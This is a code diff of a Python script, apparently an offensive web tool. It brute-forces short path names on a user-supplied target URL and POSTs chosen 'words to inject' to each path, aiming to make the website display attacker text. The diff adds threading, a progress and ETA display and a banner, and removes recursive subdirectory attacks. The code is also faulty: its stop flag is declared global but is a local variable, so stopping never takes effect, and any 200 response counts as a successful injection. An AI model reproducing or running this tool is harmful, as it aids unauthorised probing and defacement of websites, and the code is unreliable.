@@ -2,6 +2,8 @@ import os
 import requests
 import string
 import itertools
+import time
+import threading
 from colorama import Fore, Style
 
 class bcolors:
@@ -13,7 +15,7 @@ def generate_combinations(min_length, max_length):
             yield ''.join(combination)
 
 def try_exploit(url, payload):
-    response = requests.post(url, data=payload, timeout=2)
+    response = requests.post(url, data=payload, timeout=0.5)
     return response.status_code == 200
 
 def inject_words(url, words):
@@ -27,57 +29,53 @@ def inject_words(url, words):
 
     total_combinations = sum(len(string.ascii_lowercase) ** i for i in range(min_length, max_length + 1))
     completed_combinations = 0
+    start_time = time.time()
+
+    stop_attack = False
+
+    def check_for_enter_press():
+        global stop_attack
+        input()
+        stop_attack = True
+
+    enter_thread = threading.Thread(target=check_for_enter_press)
+    enter_thread.start()
 
     for combination in generate_combinations(min_length, max_length):
+        if stop_attack:
+            break
+
         directory = ''.join(combination)
         exploit_url = url + directory
         if try_exploit(exploit_url, payload):
             directories.append(directory)
 
         completed_combinations += 1
-        if completed_combinations % 100 == 0:
-            progress = (completed_combinations / total_combinations) * 100
-            loading_bar = f"{Fore.BLUE}[*]{Style.RESET_ALL} Progress: [{Fore.BLUE}{'=' * int(progress // 2)}{Style.RESET_ALL}{' ' * (50 - int(progress // 2))}] {progress:.1f}%"
-            print(loading_bar, end='\r')
+        progress = (completed_combinations / total_combinations) * 100
 
-    print()
+        elapsed_time = time.time() - start_time
+        average_time_per_combination = elapsed_time / completed_combinations
+        remaining_combinations = total_combinations - completed_combinations
+        estimated_time = average_time_per_combination * remaining_combinations
+
+        os.system("clear")
+        print(bcolors.OKCYAN + "┏┓┓ ┏┓┳┳┏┓┏┓")
+        print(bcolors.OKCYAN + "┃┃┃ ┣┫┃┃┃┓┣┫┏┓")
+        print(bcolors.OKCYAN + "┣┛┗┛┛┗┗┛┗┛┗┛┗┛")
+        print(Fore.BLUE + "Powered by Enom")
+        print(f"{Fore.CYAN}Progress: {Fore.GREEN}[{'=' * int(progress / 2)}{Fore.RED}{' ' * (50 - int(progress / 2))}{Fore.GREEN}] {Fore.CYAN}{progress:.2f}%{' ' * 10}")
+        print(f"{Fore.CYAN}Estimated Time: {Fore.YELLOW}{time.strftime('%H:%M:%S', time.gmtime(estimated_time))}")
+
     if directories:
-        print(f"{Fore.BLUE}[*]{Style.RESET_ALL} Discovered directories: {directories}")
-        answer = input("Do you want to continue and try injecting the words? [y/n]: ")
-        if answer.lower() == 'y':
-            for directory in directories:
-                print(f"{Fore.BLUE}[*]{Style.RESET_ALL} Attempting word injection in {directory}")
-                exploit_directory(url, directory, payload)
+        print("Discovered directories:")
+        for directory in directories:
+            print(directory)
     else:
-        print(f"{Fore.RED}[-]{Style.RESET_ALL} No exploitable directories found.")
+        print("No vulnerable directories found.")
 
-def exploit_directory(base_url, directory, payload):
-    exploit_url = base_url + directory
-    if try_exploit(exploit_url, payload):
-        print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Word injection successful in {directory}!")
-    else:
-        print(f"{Fore.RED}[-]{Style.RESET_ALL} Word injection failed in {directory}.")
-        subdirectories = []
-        for combination in generate_combinations(1, 8):
-            subdirectory = ''.join(combination)
-            subdirectory_url = exploit_url + '/' + subdirectory
-            if try_exploit(subdirectory_url, payload):
-                subdirectories.append(subdirectory)
+if __name__ == "__main__":
+    url = input("Enter the target URL: ")
+    words = input("Enter the words to inject: ")
 
-        if subdirectories:
-            for subdirectory in subdirectories:
-                print(f"{Fore.BLUE}[*]{Style.RESET_ALL} Attempting word injection in {directory}/{subdirectory}")
-                exploit_directory(exploit_url + '/', subdirectory, payload)
-        else:
-            print(f"{Fore.RED}[-]{Style.RESET_ALL} No exploitable subdirectories found.")
-
-os.system("clear")
-print()
-print(bcolors.OKCYAN + "┏┓┓ ┏┓┳┳┏┓┏┓")
-print(bcolors.OKCYAN + "┃┃┃ ┣┫┃┃┃┓┣ ")
-print(bcolors.OKCYAN + "┣┛┗┛┛┗┗┛┗┛┗┛")
-
-target_url = input("Enter the target URL: ")
-words = input("Enter the words you want the website to say: ")
-
-inject_words(target_url, words)
+    os.system("clear")
+    inject_words(url, words)
